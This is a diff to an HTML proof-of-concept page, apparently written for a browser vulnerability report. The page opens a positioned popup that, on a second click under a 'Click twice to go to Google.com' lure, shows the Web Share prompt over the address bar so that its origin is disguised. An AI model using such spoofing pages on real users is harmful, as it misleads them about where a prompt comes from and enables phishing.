@@ -14,8 +14,8 @@ html { font-family: sans-serif; }
 </style>
 </head>
 <body>
-<h1>Web Share over browser UI, short window</h1>
-<p>Opens popup which receives activation on second click which then shows share UI over address bar/browser UI, makes it seem like background tab is origin since popup origin and window controls are covered</p>
+<h1>Web Share Overlay Spoofing</h1>
+<p>Opens a popup that requires a second user click to trigger, after which the Web Share interface appears over the browser’s address bar and UI, making it look as if the share prompt originates from the background tab since the popup’s origin and window controls are hidden.</p>
 <a id="linkElem" href="#">Click twice to go to Google.com</a>
 <script>
 linkElem.addEventListener('click', (e) => {
@@ -24,7 +24,7 @@ linkElem.addEventListener('click', (e) => {
   var popupWidth = 340;
   var leftPos = (window.innerWidth / 2) - (popupWidth / 2) + window.screenLeft;
   window.open(
-    'share-shortwin-popup.html',
+    'poc.html',
     'test',
     'width='+popupWidth+',height=240,top='+topPos+',left='+leftPos
   );
